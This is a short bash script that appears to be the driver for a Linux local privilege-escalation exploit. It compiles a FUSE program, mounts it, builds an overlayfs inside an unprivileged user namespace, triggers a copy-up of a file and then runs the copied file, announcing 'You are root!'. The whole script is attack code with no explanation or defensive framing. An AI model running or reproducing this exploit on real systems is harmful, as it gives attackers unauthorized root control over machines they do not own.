#!/bin/bash

mkdir fuse upper overlay workdir
echo "[+] Create dir"
gcc fuse.c -o efuse -D_FILE_OFFSET_BITS=64 -lfuse
echo "[+] Compile fuse.c"
./efuse fuse
echo "[+] Create fuse file system"
unshare -Urm /bin/sh << EOF
    mount -t overlay overlay -o lowerdir=fuse,upperdir=upper,workdir=workdir overlay
    echo "[+] Create overlayFS"

    touch overlay/hello
    echo "[+] Copy Up"

    exit
EOF
echo "[+] You are root!"
upper/hello
